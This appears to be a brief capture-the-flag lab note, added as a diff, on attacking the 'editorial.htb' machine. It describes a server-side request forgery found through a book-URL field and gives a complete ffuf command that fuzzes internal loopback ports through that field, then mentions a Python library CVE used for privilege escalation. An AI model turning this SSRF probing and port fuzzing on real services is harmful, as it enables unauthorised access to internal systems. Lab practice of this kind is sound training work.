@@ -1,0 +1,13 @@
+identify ssrf inside publish book section (In the preview book part). i make a request and in bookurl parameter i insert (my local machine -> http://<TUN_IP>:PORT)and i listen with http server 
+for incoming connections to check for ssrf . To get some actual useful data , i had to fuzz for the right port , when requesting on the loopback address(127.0.0.1) , it turned to be port 5000 .
+
+
+
+Command used for port fuzing  ->
+ ffuf -w digits -u http://editorial.htb/upload-cover -X $'POST' \
+    -H $'Host: editorial.htb' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: multipart/form-data; boundary=---------------------------261091668710630024753319004888' -H $'Content-Length: 7262' -H $'Origin: http://editorial.htb' -H $'Connection: keep-alive' -H $'Referer: http://editorial.htb/upload' -H $'Priority: u=0' \
+    --data-binary $'-----------------------------261091668710630024753319004888\x0d\x0aContent-Disposition: form-data; name=\"bookurl\"\x0d\x0a\x0d\x0ahttp://127.0.0.1:FUZZ\x0d\x0a-----------------------------261091668710630024753319004888\x0d\x0aContent-Disposition: form-data; name=\"bookfile\"; filename=\"http_proxies.txt\"\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------261091668710630024753319004888--\x0d\x0a' \
+    $'http://editorial.htb/upload-cover'
+ 
+
+Inside the server , i had to exploit a python library CVE to get PE.
